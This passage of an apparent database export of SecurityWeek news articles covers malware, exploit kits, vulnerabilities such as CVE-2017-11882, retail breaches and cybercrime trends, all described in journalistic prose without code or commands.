under the radar of most organization's security checks,\" the Security Response team told SecurityWeek. \"As such, we suspect more organizations may have been attacked, but are unaware of it.\"   " }

The tool, named “Pandemic,” installs a file system filter driver designed to replace legitimate files with a malicious payload when they are accessed remotely via the Server Message Block (SMB) protocol. What makes Pandemic interesting is the fact that it replaces files on-the-fly, instead of actually modifying them on the device the malware is running on. By leaving the legitimate file unchanged, attackers make it more difficult for defenders to identify infected systems. “Pandemic does NOT//NOT make any physical changes to the targeted file on disk. The targeted file on the system Pandemic is installed on remains unchanged. Users that are targeted by Pandemic, and use SMB to download the targeted file, will receive the 'replacement' file,” the tool’s developers said. Pandemic, which works on both 32-bit and 64-bit Windows systems, is initially installed on machines from which users download or execute files remotely via SMB. According to the documents leaked by WikiLeaks, the tool can replace up to 20 files at a time – each with a maximum size of 800Mb. Pandemic developers also provide a DLL file that can be used to determine if the tool is installed, and uninstall it. The files published by WikiLeaks contain information that can be useful for checking a system for Pandemic infections.

Tracked as CVE-2017-11882, the vulnerability resides in the Microsoft Equation Editor (EQNEDT32.EXE), a tool that provides users with the ability to insert and edit mathematical equations inside Office documents. The bug was discovered by Embedi security researchers as part of very old code in Microsoft Office. The vulnerable version of EQNEDT32.EXE was compiled on November 9, 2000, “without essential protective measures,” the researchers say. Although the component was replaced in Office 2007 with new methods of displaying and editing equations, Microsoft kept the vulnerable file up and running in the suite, most likely to ensure compatibility with older documents. “The component is an OutPorc COM server executed in a separate address space. This means that security mechanisms and policies of the Office processes do not affect exploitation of the vulnerability in any way, which provides an attacker with a wide array of possibilities,” Embedi notes in a research paper (PDF). EQNEDT32.EXE, the researchers explain, employs a set of standard COM interfaces for Object Linking and Embedding (OLE), an Office feature already known to be abused by cybercriminals. The researchers discovered they could cause a buffer overflow using a procedure calling a function designed to “copy null-term lines from an internal form to buffer which was sent to it as the first argument.” The bug, the researchers say, can be exploited to achieve arbitrary code execution. According to Embedi, the use of several OLEs designed to exploit the vulnerability could lead to the execution of an arbitrary sequence of commands, such as downloading a file from the Internet and executing it. The security researchers claim that they managed to create an exploit that would work with all Office versions released over the past 17 years, including Office 365, and which would impact all Windows versions, including Windows 10 Creators Update. Furthermore, the exploit would work on all architectures. The most worrying aspect of the vulnerability is that the exploit doesn’t require user interaction for it to work, once the malicious document carrying the code is opened. In fact, the attack would not even interrupt a user’s work with Microsoft Office, the researchers claim. “The only hindrance here is the protected view mode because it forbids active content execution (OLE/ActiveX/Macro). To bypass it cyber criminals use social engineering techniques. For example, they can ask a user to save a file to the Cloud (OneDrive, GoogleDrive, etc.). In this case, a file obtained from remote sources will not be marked with the MOTW (Mark of The Web) and, when a file is opened, the protected view mode will not be enabled,” Embedi notes. This vulnerability, the researchers conclude, proves that EQNEDT32.EXE is an obsolete component that may contain other security weaknesses, possibly easily exploitable. Had standard security mitigation been used when compiling the file, the vulnerability wouldn’t be exploitable, the researchers say. The vulnerability was reported to Microsoft in April 2017. The software giant addressed it this week, as part of its November 2017 Patch Tuesday. " }

The vulnerability is a use-after-free issue patched in MS14-056, which fixed a total of 14 IE bugs altogether. According to FireEye Staff Research Scientist Dan Caselden, the exploit has been added to the Angler exploit kit. Angler is often associated with exploits for Internet Explorer, Adobe Flash Player and Microsoft Silverlight. \"The Angler Exploit Kit (EK) recently implemented a modified version of k33nteam’s exploit targeting the same patched vulnerability,\" Caselden blogged. \"This is interesting because it is the first instance we’ve seen of an attack in the wild targeting IE deployments that are using Microsoft’s new MEMPROTECT mitigations. It shows that exploit authors are still interested in attacking IE.\" MEMPROTECT (Memory Protector) was introduced by Microsoft in July to make it difficult for hackers to execute use-after-free attacks. While the mitigations are not unbeatable, they increased the difficulty for exploit authors developing new IE exploits as evidenced by the absence of new IE exploits discovered in the wild, Caselden blogged. \"Thankfully, the exploitation technique does not include a generic bypass for MEMPROTECT,\" he added. \"The vulnerability is a UAF (use-after-free) with MSHTML!CTitleElement that MEMPROTECT was not designed to mitigate. As a result, some of the employed techniques (particularly the modified garbage collection routine) were not necessary. So, in the future, exploit authors will need to find a reliable way around the delayed free, or bugs with another object that falls outside of the CMemoryProtector’s domain.\" Recently, researchers at Websense named Angler as possibly the most sophisticated exploit kit used by cybercriminals today, utilizing a number of techniques to defeat detection, such as encrypted payloads and the ability to detect antivirus and virtualization software. \"It has pioneered solutions that other exploit kits started using later, such as antivirus detection and encrypted dropper files,\" according to Websense Security Researcher Abel Toro. \"In addition, Angler tends to be the quickest to integrate the latest zero days, such as the Adobe Flash zero day (CVE-2015-0311) from a few weeks ago, and it employs a notably unique obfuscation. Finally, Angler runs the dropped malware from memory, without ever having to write to the hard drive; this unique technique among exploit kits makes it extremely difficult for traditional antivirus technologies to detect it as they rely on scanning the file system.\" *This article was updated to identify Abel Toro.

Kmart, a subsidiary of Sears Holdings, has not provided any information on which stores are affected and for how long hackers had access to its systems. The retailer operates more than 700 stores, but blogger Brian Krebs learned from his sources in the financial industry that the breach does not appear to impact all locations. It’s unclear what point-of-sale (PoS) malware has been used in the attack, but the retailer has described it as “a new form of malware” and “undetectable by current antivirus systems.” The company’s investigation showed that names, addresses, social security numbers, dates of birth, email addresses and other personally identifiable information (PII) have not been compromised. Kmart believes the attackers may have only accessed payment card numbers. “All Kmart stores were EMV ‘Chip and Pin’ technology enabled during the time that the breach occurred, and we believe the exposure to cardholder data that can be used to create counterfeit cards is limited,” said Gareth Glynne, senior VP of retail operations at Sears & Kmart. “There is no evidence that kmart.com or Sears customers were impacted nor that debit PIN numbers were compromised.” Kmart is working with law enforcement authorities, banking partners and cyber security firms to investigate the incident. The retailer is not offering any credit monitoring services to affected customers given that only limited information has been exposed, but it has advised them to review and monitor their payment card statements. This is not the first time Kmart discloses a data breach. In October 2014, the company told customers that their credit and debit cards may have been stolen after hackers installed malware on payment systems. In both incidents, the company described the malware as being “undetectable by current antivirus systems” and in both cases it claimed that only card numbers were compromised. Kmart said the latest breach does not appear to be linked to a previous incident. “I think the single most important piece of information that we know so far is that this could have been much, much worse,” said Richard Henderson, global security strategist at Absolute. “If KMart did not have EMV-enabled terminals in their stores, forcing customers with chip cards to swipe their stripe, then the impact may have been substantially larger. It's critical that we continue the slow march in the US to full EMV adoption. While EMV is by no means infallible, it is leagues better than the ancient mag stripe technology that continues to be exploited by attackers on a regular basis.\" Related Reading: Over 200 Brooks Brothers Stores Hit by Payment Card Breach Related Reading: Home Depot to Pay Banks $25 Million for 2014 Breach Related Reading: Target to Pay States $18.5 Million Over 2013 Data Breach " }

On the heels of the Superfish embarrassment earlier this year, the Chinese computer manufacturer is warning that multiple vulnerabilities in the \"Lenovo Solution Center\" could expose millions of users to malicious hacker attacks. The most serious of the four vulnerabilities, reported by Trustwave's SpiderLabs, could \"allow a remote attacker or local user to execute arbitrary code with SYSTEM privileges,\" Lenovo warned in an advisory. The vulnerabilites carry a high-severity rating. The flaw-ridden Lenovo Security Center (LSC) comes pre-installed and activated on millions of Lenovo laptops, desktop and tablet machines.  It is meant to serve as a troubleshooting utility to allow users to perform diagnostic functions and quickly identify the status of PC system hardware and software health, network connections and the presence of security features such as firewalls or antivirus programs.  The sofware is basically a frontend user interface and a backend service process that runs on the user's computer even if the frontend userface is turned off. From Lenovo's advisory: Vulnerabilities were identified within LSC’s backend service process that may allow a local user to execute arbitrary code with SYSTEM level privileges. In addition, a cross-site request forgery (CSRF) vulnerability exists that may allow exploitation of these vulnerabilities if a user opens a malicious  web site or crafted URL while the LSC backend service is running on a user’s machine.  The user’s computer may still be vulnerable even if the LSC user interface is not running. The company confirmed the vulnerabilities are present in all versions of LSC earlier than version 3.3.0002.  The latest security hiccups follow the discovery earlier this year of the Superfish browser add-on that was shipped on numerous Lenovo laptop models.   The Superfish adware broke HTTPS browsing and put users at risk. The company apologized to customers and issued instructions to remove the application. Lenovo preloaded the WindowShopper browser add-on from Superfish thinking that customers would enjoy its features. However, many users were annoyed by it and started complaining on the Chinese manufacturer’s forums. After security researchers analyzed the software, they realized that it posed serious risks. The adware injects ads into web pages by using a local proxy and a self-signed root certificate. Superfish actually replaced legitimate certificates with its own, making connections that should be secure untrusted. " }

The new malware, dubbed Reaver, was analyzed by researchers at Palo Alto Networks, who identified ten different samples representing three versions of the threat. The final payload of the malware has been loaded using Windows Control Panel (CPL) files, which is highly uncommon – Palo Alto Networks said only 0.006% of the malware it has seen leverages this technique. A surge in CPL malware was observed in 2013 and 2014 in Brazil, where cybercriminals had been using it to deliver banking Trojans. Based on the infrastructure it uses, Reaver has been linked by experts to SunOrcal, a piece of malware used by threat actors believed to be located in China in attacks aimed at the January 2016 presidential election in Taiwan. The group behind SunOrcal is also said to be using the Surtr RAT, which has been tied to malicious document generators named HomeKit and Four Element Sword. The threat actor has been around since at least 2013, but some evidence suggests it may have been active since as early as 2010. Palo Alto Networks does not have information on the individuals or organizations targeted with Reaver, but based on the group’s previous campaigns, the attacks were likely aimed at one of China’s “Five Poisons:” Uyghurs, Tibetans, Falun Gong, the Chinese democracy movement, and the movement for Taiwan’s independence. The malware abuses the Control Panel utility in Windows, control.exe, to load the Reaver payload. The first version of the threat uses HTTP for communication, while the newer versions rely on TCP. Once it infects a device, Reaver can help its operators collect information about the compromised system, including CPU speed, computer name, username, IP, memory information and Windows version. The malware can also read and write files, alter files and registries, spawn and terminate processes, and modify services. The hackers started using Reaver sometime in late 2016 alongside SunOrcal. Both pieces of malware have been seen in attacks as recent as November 2017. Palo Alto Networks has published a detailed analysis of Reaver, along with indicators of compromise (IoC) and information on overlaps with SunOrcal. " }
{ "_id" : { "$oid" : "5b27c4c36cefc41c844ab3cb" }, "Category" : "Malware", "Title" : "Many Antivirus Engines Plagued by Vulnerabilities: Researcher", "Address" : "https://www.securityweek.com/many-antivirus-engines-plagued-vulnerabilities-researcher", "Date" : "July 29, 2014", "Article" : "Several of the most popular antivirus products contain vulnerabilities that can be exploited locally or remotely, a security researcher revealed at the SyScan 360 security conference in Beijing earlier this month. Joxean Koret, a researcher at Singapore-based security company Coseinc, tested roughly 17 antivirus engines, 14 of which have been found to be vulnerable, including ones from Avast, AVG, Avira, Bitdefender, ClaimAV, Comodo, Dr.Web, ESET, Ikarus eScan, F-Secure, Sophos, Bkav and Panda Security.  Koret pointed out several factors that make antivirus engines more vulnerable, including the fact that they're mostly written in C and C++, which leads to buffer and integer overflows; they run with root privileges, which means an attacker could gain the highest privileges if he can find an exploit; they support a large number of file formats, which results in bugs in the parsers; and updates are performed via HTTP, which leaves them exposed to man-in-the-middle (MitM) attacks. Antivirus software in general doesn't properly protect computers against sophisticated attackers. On the contrary, in some cases it increases the attack surface and it can even lower operating system protections, making users even more vulnerable, the expert argued.  The researcher found vulnerabilities through the software testing technique called fuzzing, and by performing basic local and remote checks of the updating protocol, network services, address space layout randomization (ASLR), and access control lists.  The list of identified security holes includes a heap overflow in Avast, a heap overflow in AVG, multiple remote vulnerabilities in Avira, Bitdefender and Dr.Web, a heap overflow in Comodo, an integer overflow in ESET, multiple local privilege escalations in Panda, and multiple command injections in eScan, the expert revealed in his presentation.   Exploiting these vulnerabilities can be done just like on other client-side applications, the expert said. In a common antivirus engine exploitation scenario described by Koret, the attacker compresses several files inside an archive. When the archive is scanned, the antivirus unpacks the compressed files and scans each of them. The first file in the archive can be set up to force the emulator to be loaded and used, while the second file contains the real exploit. Some of the flaws found by Koret have been addressed, but some of them remain unfixed. The expert has only reported his findings to Avast, because the company has a bug bounty program, ClaimAV, because their antivirus is open source, Panda, because he has \"friends\" there, and Ikarus, ESET and F-Secure, because they contacted him and \"asked for help nicely.\" Ondrej Vlcek, chief operating officer at Avast, has confirmed that the issues reported to the company have been fixed.  \"There are always bugs in software. At AVAST, we do as much as we can to find our bugs and fix them. We are the only consumer security company to have introduced a bug bounty. Our bug bounty program offers an incentive to our users if they report bugs to us. In his presentation, Joxean Koret actually praised this strategy, claiming that the bug bounty was the only reason why he reported the bugs in the first place,\" Vlcek told SecurityWeek. Panda Security representatives have told SecurityWeek that Koret, who previously worked at PandaLabs, informed the company of his findings in the Panda Global Protection 2013 product. According to PandaLabs Technical Director Luis Corrons, the flaws have been fixed.  As far as the other vendors are concerned, the researcher says he doesn't contact \"irresponsible multi-million dollar companies,\" and urges them to audit their products.  Bitdefender, whose antivirus engine is used by several other companies, has been working on fixing these and other vulnerabilities plaguing its products. \"We have been aware of Mr. Koret's findings since he published his presentation, having had no prior contact, as Mr. Koret does not believe in responsible disclosure. We have fixed the bugs which he has published proof of concept exploits for, within days of publication,\" Bitdefender said.  \"Since the announcement, we have also conducted an internal code audit, fixed a number of other bugs and made changes to our build and QA processes which should result in far sturdier code and prevent similar situations in the future. We are still not in possession of the list of alleged bugs found by Mr. Koret, so we cannot tell if we have fixed them all, or, indeed, even if they are all reproducible.\"  After Koret tweeted some of his findings, ESET proactively contacted him to learn more about the issue, Jakub Debski, Head of Core Technology Development at ESET, told SecurityWeek. “ESET resolved the problem and published an update in less than three daysm,\" Debski said. \"ESET always welcomes researchers who follow responsible disclosure procedures of bugs and issues. While we do everything possible to ensure that products are fault free, sadly no software is perfect.\"   " }

The situation may be exacerbated by many users not keeping up to date with patches. According to Kaspersky Lab, of the 161 vulnerabilities detected in various versions of Java during the life of the study, most were in versions 1.5, 1.6 and 1.7, which are the most prevalent versions of the software.     \"Remarkably, SE 6 U37 — released back in October 2012 — was the most recent version of Java 1.6 in the Top 10 most commonly used versions,\" according to the report. \"The conclusions are obvious: one and a half months after the release of the latest version of Java, most users are still working with vulnerable versions.\"   Java security has had a rough year from both a security and a public relations standpoint. The presence of high-profile vulnerabilities and activity by attackers arming exploit kits with attack code prompted Oracle in January to pledge security improvements and additional outreach to educate the Java user community.   According to Kaspersky, the increase in attacks represents more than 33 percent increase since September 2011 and August 2012. Fifty percent of all the attacks were launched using just six families of Java exploits.   Most of the attacks (80 percent) between occurred in 10 countries, with the top three being the United States, Russia and Germany.     A slight uptick in attacks was detected between March and August, when 8.54 million of the attacks were observed. During that period, 31.14 percent of the attacks were traced to servers hosted in the United States. Roughly 18 percent of the attacks were found to have originated in Russia.   \"Oracle has patched all critical vulnerabilities, and information about these patches was disclosed during the period addressed in this report,\" Kaspersky's report noted. \"In some cases, just a couple of days passed before a patch was released. All the same, the number of attacks and the number of users subjected to these attacks continued to rise.\" " }

According to Sophos, the malware is now hiding the malicious payload in Windows registry instead of writing the file on disk. The change underscores the continued development of the malware, which has been linked to a number of advanced persistent threat (APTs) campaigns. In recent months, a PlugX variant has also been spotted with a peer-to-peer communication channel as well. \"Malware hiding components in registry is not a revolutionary idea; we have seen that before,\" Sophos researcher Gabor Szappanos noted in a new paper on the malware. \"Most notably the recent Poweliks Trojan...stored the active script component in the registry. Even some of the APT malware families, like Poison or Frethog, occasionally used the registry as storage for the main payload. There were precursors even within the criminal groups distributing PlugX: they used this method back in 2013 in a couple of cases for storing the Omdork (a.k.a. Sybin) payload. So it was only a question of when the same would happen to the main PlugX backdoor.\" The first sample using the tactic was distributed at the end of January. Based on the version dates, the development of these new variants happened earlier that month, he told SecurityWeek. According to Sophos, the new variants seen by the firm were distributed using two distinguishable classes of exploited carrier documents – though in both cases the CVE-2012-0158 exploit was used. \"For the first type the distribution was part of a longer campaign, targeting India,\" according to the report. \"This campaign spanned several months, from September 2014 to February 2015. During this time span different variants of the PlugX backdoor were observed as the final payload. Apparently, this was an ongoing operation, where the actors behind it used the latest available versions, as they came out of the factory. Additionally, a few affiliated malware families were distributed to the targets. The samples of the second type showed up the first week of February. At this point we don’t have conclusive information about the scope and target of the campaign that used these samples.\" In its recent Global Threats Report, Crowdstrike noted that the use of the PlugX tool continued to gain steam in 2014 with multiple attack groups using it against a variety of sectors – particularly the science, technology, government and defense industries. In November, researchers at ESET said a threat group was using the malware to target military officials and diplomats in Russia, Afghanistan and other countries, and in January the malware was spotted being used in attacks against online gamers in Asia.

A new variant has been found targeting more than 30 Japanese financial institutions, including 12 regional banks. The update builds upon the Trojan's previous capability to target eight banks in the country, and continues the malware's focus on the nation.  \"Snifula’s new targets show that the malware is broadening its focus to smaller financial institutions, meaning that consumers should be wary of the threat regardless of which bank they use,\" Symantec's security response team noted. \"We previously predicted that Snifula would be updated to target additional financial institutions and now it has happened. While monitoring Snifula’s activities, we came across a configuration file for a Snifula variant that lists 20 credit card sites and 17 online banking sites in Japan.\" As of July, Japan is home to 20 percent of the Snifula attacks. The United Kingdom (24 percent) and Germany (20 percent) make up the top three. The United States is fourth with 15 percent. The updated Trojan is the latest evolution of the Snifula malware family, which Symantec researchers trace back to 2006. It features a number of capabilities many cybercriminals would love - keystroke logging, digital certificate theft, screenshot and video capture and remote access to name a few. Once a machine is infected, the malware contacts the command and control server and downloads a configuration file for man-in-the-browser attacks. A configuration file is designed for each target country and contains two parts. The first is code injected into Web pages to display phony messages that typically ask the user to input information such as personal identification numbers or one-time passwords. The second part of the file tells the malware what types of sites it should monitor. The malware monitors the Web pages user visits and logs when any of the strings in the configuration file match part of a URL or Web page content.  While the configuration file for Japan contains more than 30 financial institutions, the file for Germany has 10 and the U.S. file contains a list of more than 50. The 12 regional banks in the configuration file for Japan are spread across 12 prefectures. Only one of these banks made the top 10 list in terms of total deposit balances from customers, the researchers explained. Instead, more than half of the targeted banks are at the bottom half of the overall list.  \"This clearly shows that the targeted banks are picked regardless of the institution’s size,\" according to Symantec. \"We expect that other regional banks will likely be targeted by Snifula, so consumers should not let their guard down when using any online banking site.\" " }

Fareit, also known as Pony Loader, is an information stealer malware family that has been making rounds since 2011. It recently joined the long list of threats that abuse the Windows PowerShell task automation and configuration management framework in their malicious routines. The latest version of Fareit has been delivered to victims via spam emails carrying apparently harmless documents. The attackers have used two different tactics to drop and execute the malware: Word documents and malicious macros, and PDF documents and Windows PowerShell. In attacks involving PDF files, the documents used as bait are set up to execute PowerShell via the OpenAction event, which leads to Fareit being downloaded on the victim’s machine. Once it infects a device, the malware, detected by Trend Micro as TSPY_FAREIT, starts collecting login details, Bitcoin-related data and other valuable information. There are several malware families that abuse PowerShell, including Vawtrak, PowerWare and PowerSniff. However, attacks involving these threats require the execution of a malicious macro before PowerShell steps into play. In the case of Fareit, however, the PDF documents use the OpenAction event to directly run PowerShell with the parameters containing the malicious code. This technique can be more efficient considering that macros are disabled by default and the attacker needs to trick victims into enabling the feature before the malware can be deployed. “As both PDFs and macros are used in most organizations and enterprises, employees are quite susceptible to fall for FAREIT. Users are advised to install security software that can detect spammed messages and malicious files related to this threat,” Trend Micro said. The source code for Pony Loader versions 1.9 and 2.0 was leaked a few years ago, allowing cybercriminals to improve the malware for profitable attacks. In 2013, researchers discovered a campaign where the threat had been used to steal credentials for roughly 2 million accounts. " }

However, researchers believe the cybercriminal made a relatively small profit and failed to protect his real identity. The security firm first spotted the malware, which it tracks as “Bachosens,” in 2014, but there is evidence that its developer had launched attacks since as early as 2009. Symantec initially believed that the attacks involving Bachosens had been carried out by a nation-state threat actor given the malware’s sophistication, but further analysis revealed some rookie mistakes. Bachosens, believed to have been delivered via spear-phishing emails, is a backdoor Trojan that gives its operator persistent access to the targeted system. In the attacks it analyzed, Symantec also spotted a keylogger, which researchers believe was manually pushed by the cybercriminal onto the infected device. Unlike many other backdoors, which use HTTP or HTTPS to communicate with their command and control (C&C) servers, Bachosens uses DNS, ICMP and HTTP. The malware leverages a domain generation algorithm (DGA) to create C&C domains, but experts determined that the DGA is configured to only generate 13 domains per year. Symantec has observed Bachosens infections on the systems of a Chinese autotech company and a large commercial airline. There is also evidence that the attacker targeted an online gambling firm, but his attempts failed. While Bachosens is fairly advanced, the fact that the keylogger did not use any obfuscation, and the fact that one malware sample was packaged with an online game led experts to realize that these attacks were not the work of a sophisticated threat actor. A closer analysis of strings found in the malware and domain registration data pointed researchers to a Russian-speaking individual who appears to reside in the town of Tiraspol in eastern Moldova. Tiraspol is the capital of the self-proclaimed state of Transnistria, where Russian is the dominant language. The hacker, who researchers have identified only as Igor, is apparently connected to an auto parts store, which explains why he would target the Chinese autotech company. Researchers said the cybercriminal stole car diagnostics software that retails for $1,100 and sold it for only $110 on various forums and specifically created websites. On the other hand, it’s unclear why Igor would target a commercial airline. Experts said the hacker posted personal information on public car forums, exposing his real identity. “The level of information the attacker knowingly or negligently revealed about himself online gave us high confidence that he is an individual involved in the auto industry who is based in this part of Eastern Europe,” Symantec said in a blog post. “His likely location in Tiraspol may also explain why he appears to have such modest aims when it comes to the gains he seems to be making from cyber crime. Although it is hard to get official data given it is a disputed territory, the average monthly salary in Transnistria has been reported as being as little as a few hundred euro. In that context, selling stolen software online for a few hundred euro could represent quite the windfall for an individual based in that part of the world,” the company added. While researchers have apparently obtained a significant amount of information on the malware and its developer, some questions remain, including how Igor managed to create a sophisticated piece of malware while doing such a poor job at protecting his identity. One possibility is that he acquired the malware from someone, but Symantec believes this is unlikely given that no one else has used Bachosens. " }

Between March 2016 and March 2017, Google researchers identified 12.4 million potential victims of phishing, roughly 788,000 potential victims of keylogger malware, and over 1.9 billion users whose accounts had been exposed due to data breaches. The fact that third-party data breaches expose significant amounts of information is not surprising. Several companies admitted that hackers had stolen the details of millions of users from their systems and Yahoo alone exposed over one billion accounts in the past years. However, Google’s analysis showed that only less than 7 percent of the passwords exposed in third-party data breaches were valid due to password reuse. Furthermore, the company’s data suggests that credential leaks are less likely to result in account takeover due to a decrease in password reuse rates. On the other hand, nearly a quarter of the passwords stolen via phishing attacks were valid, and Google believes phishing victims are 460 times more likely to have their accounts hacked compared to a random user. As for keyloggers, nearly 12 percent of the compromised passwords were valid, and falling victim to such malware increases the chances of account takeovers 38 times. Phishing kits and keyloggers are also more likely to lead to account hijacking due to the fact that many of them also collect additional information that may be requested by the service provider to verify the user’s identity, including IP address, location and phone number. An analysis of the most popular phishing kits revealed that they mainly target Yahoo, Hotmail, Gmail, Workspace Webmail (GoDaddy) and Dropbox users. In the case of keyloggers, the HawkEye malware appears to be the most successful, with more than 400,000 emails containing stolen credentials being sent to attackers. Cyborg Logger and Predator Pain also made a significant number of victims. As for the location of the individuals using these phishing kits and keyloggers, Google’s analysis of the IP addresses used to sign in to the email accounts receiving stolen credentials revealed that the top country is Nigeria in both cases. “Our findings were clear: enterprising hijackers are constantly searching for, and are able to find, billions of different platforms’ usernames and passwords on black markets,” Google employees wrote in a blog post. “While we have already applied these insights to our existing protections, our findings are yet another reminder that we must continuously evolve our defenses in order to stay ahead of these bad actors and keep users safe.” " }

The McAfee report revisits an analysis performed by Carnegie Mellon University's Computer Emergency Response Team (CERT). In September, CERT revealed that more than 20,000 Android applications failed to validate SSL certificates, leaving users vulnerable to attackers. A spreadsheet of the affected applications can be found here.     According to McAfee Labs, nearly three-quarters of the 25 most downloaded apps on CERT's list are still unpatched.   \"Specifically, we dynamically tested the top 25 downloaded mobile apps that had been identified as vulnerable by CERT in September to ensure that usernames and passwords are no longer visible as a result of improper verification of SSL certificates,\" according to the McAfee report. \"To our surprise, even though CERT notified the developers months ago, 18 of the 25 most downloaded vulnerable apps that send credentials via insecure connections are still vulnerable to MITM attacks.\"   \"The most downloaded vulnerable app in this group is a mobile photo editor with between 100 million and 500 million downloads,\" the report continues. \"The app allows users to share photos on several social networks and cloud services. In late January, McAfee Labs tested the most current version of the app downloaded from Google Play using CERT Tapioca; we were able to intercept the app’s username and password credentials entered to log into the cloud service to share and publish photos.\"   While the researchers did not find evidence that these apps had been exploited, the cumulative number of downloads for the apps ranges into the hundreds of millions.   \"Mobile devices have become essential tools for home to enterprises users as we increasing live our lives through these devices and the applications created to run on them,\" said Vincent Weafer, senior vice president of McAfee Labs, part of Intel Security, in a statement. \"Digital trust is an imperative for us to truly engage with and benefit from the functionality they can provide. Mobile app developers must take greater responsibility for ensuring that their applications follow the secure programming practices and vulnerability responses developed over the past decade, and by doing so provide the level of protection required for us to trust our digital lives with them.\"   The latest findings were included in the McAfee Labs Threat Report: February 2015, which also revealed that mobile malware samples jumped 14 percent during the final quarter of 2014. Asia and Africa led the way with the highest infection rates. In addition, at least eight percent of all McAfee-monitored mobile systems reported an infection in the fourth quarter of last year, with much of the activity tied to the AirPush ad network.   In addition to mobile security, the report also touched on the growth of the Angler exploit kit, which grew in popularity among attackers in the second half of 2014. The full report can be read here.

GozNym, a malware that combines code from the Nymaim ransomware dropper and the Gozi ISFB banking Trojan, surfaced in April, when it was observed targeting 24 financial institutions in North America. According to IBM X-Force researchers, malicious actors have begun using the malware in attacks aimed at Europe. The threat has targeted corporate, investment banking and consumer accounts at 17 banks in Poland and one major bank in Portugal. In addition to banks, the Trojan also targets the customers of Polish webmail service providers. Once it infects a device, the malware monitors the victim’s online activities and compares the websites they visit to a list of 230 URLs stored in its configuration file. When one of these sites is accessed, a redirection attack is initiated and the user is taken to a phishing page that mimics the targeted service. Such redirection attacks are common for financial malware, including well-known threats such as Dridex and Dyre. However, GozNym authors have come up with a two-phase redirection scheme that should make it more difficult for researchers to analyze the campaign. In the first phase, when users visit one of the targeted websites, they are immediately redirected to the corresponding phishing page. This page, which allows attackers to collect credentials and two factor authentication data, appears to be hosted on the bank’s legitimate domain and even an SSL certificate indicator is displayed in the browser’s address bar. This is done by sending empty requests to the bank’s legitimate website in an effort to keep the SSL connection alive. While users are taken to the malicious page in the first phase of the attack, the content of this page is actually under a blank overlay mask that covers the entire screen. By covering up the malicious content, cybercriminals make it look like an empty page when someone attempts to examine it. The redirection, the phishing page and the overlay screen are fetched from a command and control (C&C) server hosted in Moscow, Russia. In the second phase of the attack, the overlay screen is removed and the phishing page is displayed to the victim. This is done via a JavaScript file that manipulates the Document Object Model (DOM). After the initial login data is provided, a delay screen is injected and the victim is instructed to wait. In the meantime, the attackers query the C&C server for webinjections designed to trick them into handing over additional information. The second phase relies on a different C&C server, which makes the attack more difficult to analyze. “Projects of this technical level are the domain of a few major cybercrime gangs active in the world. Convincing redirection attacks are a resource-intensive endeavor that require their operators to invest heavily in creating website replicas of individual targeted banks. The Nymaim gang stands out as one of very few groups with this capability,” said Limor Kessem, executive security advisor at IBM. “Currently, the only other known malware actively using redirection attacks is the Dridex gang. Rumors say a Neverquest faction also employs them; however, the latter has not yet been detected in the wild.” " }

Those interested in obtaining exploits and other information from the group will have to pay a monthly fee of roughly $20,000. The Shadow Brokers announced the “monthly dump service” following the WannaCry ransomware attacks, which leveraged an exploit leaked by the group. The exploit in question, dubbed EternalBlue, was one of the many files allegedly stolen from the NSA-linked actor known as the Equation Group. The hackers have insisted that their main goal is to make money, and since their previous attempts have had little success, they have now decided to offer the remaining Equation Group files for a monthly fee. While some experts believe the most important files may have already been made public, the group claims it’s still in possession of a lot of data, including exploits for Windows 10, web browsers, routers and smartphones, SWIFT network data, and information on nuclear and missile programs in Russia, China, Iran and North Korea. The first monthly dump will be made available sometime between July 1 and July 17. The hackers claim they have yet to decide on what to leak, but it will be “something of value to someone.” Individuals and organizations that want to receive the files will have to pay 100 units of Zcash, a digital currency advertised as “permissionless cryptocurrency that can fully protect the privacy of transactions using zero-knowledge cryptography.” The 100 Zcash, currently worth roughly $20,000, must be sent to a specified address during the month of June along with an email address to which the files will be delivered. The group said the files will be sent out as a “mass email,” which indicates that all subscribers will receive the same files. The Shadow Brokers said they realize that $20,000 is not an amount anyone can pay, and pointed out that the monthly dump service is mainly for security companies, governments, OEMs, hackers and “high rollers.” The hackers noted that there are also some risks associated with Zcash, which they can’t guarantee is safe and reliable. The Shadow Brokers had previously attempted to monetize the Equation Group exploits through auctions, crowdfunding campaigns, and direct sale, but none of the methods was as successful as the group had hoped. Their latest attempt could be more successful considering that the monthly subscription fee is significantly smaller compared to the thousands of bitcoins they previously demanded. Matthew Hickey, co-founder of security firm Hacker House, has proposed launching a Kickstarter campaign to raise the money. Once the exploits are obtained, they would be analyzed and disclosed responsibly to affected vendors. However, not everyone agrees with the idea. Also, I think Equation Group, whoever they may be, should responsibility disclose all the stolen exploits. They're burned now, being sold. — Kevin Beaumont (@GossiTheDog) May 30, 2017    To date, the Shadow Brokers have managed to earn only 10.5 bitcoins, which is currently worth roughly $24,000. F-Secure’s Mikko Hypponen noticed recently that the hackers had emptied their original Bitcoin wallet and started distributing the money to tens of other addresses. " }

The incident is surrounded by mystery, and several conspiracy theories have emerged, allowing cybercrooks to exploit the tragedy for a wide range of activities, including spam, scams and malware distribution.  \"Unfortunately, the actions of hackers worldwide are designed to generate profits. They focus on psychological triggers, on anything they can use in order to draw people’s attention and con them into getting from them whatever they wish whether its sensitive data, web traffic, clicks and so on,\" Alex Balan, product manager at BullGuard, told SecurityWeek. \"Any important event which is of high interest (such as tragedies similar to MH17 flight or the results of an election before it is closed) will be used by hackers in order to monetize people’s curiosity and interest.\" Spam and scams According to security researchers, most of the cybercriminal operations leveraging the MH17 flight incident rely on social media websites instead of spam emails. However, Kaspersky Lab experts spotted one religious email-based spam run abusing the news. Many of the scams that have been making the rounds over the past few days are connected to websites involved in affiliate marketing strategies based on CPA (Cost Per Action) or CPC (Cost Per Click) monetizing schemes, BullGuard said.  One scam spotted by Hoax Slayer attempts to trick users into completing surveys by promising them actual footage of the missile fired by pro-Russia militants to take down the Malaysian airliner. Other scammers have been trying to lure internauts to shady websites with the help of fake Facebook tribute pages. Trend Micro analyzed a Twitter spam campaign that started shortly after Malaysia Airlines reported that it had lost contact with flight MH17 from Amsterdam. Several tweets written in Indonesian attempted to lure people to various websites and ads.   “Unfortunately, whenever disaster strikes the Internet scammers are never far behind. The fake social media pages which lead to surveys and use names or photographs of the victims in this case are particularly distasteful. Usually these will use imagery of a downed plane, or a car crash or something else which steers clear of the victims,\" Chris Boyd, malware intelligence analyst with Malwarebytes, told SecurityWeek. “However, it seems that in recent months the so-called ‘shock video’ social engineering has become more and more salacious and poor taste in an effort to keep people clicking. This is likely the next step in that evolution. Elsewhere on social media, rogue links and phishing attempts will continue to be peddled. We advise all netizens to obtain their news from verified and 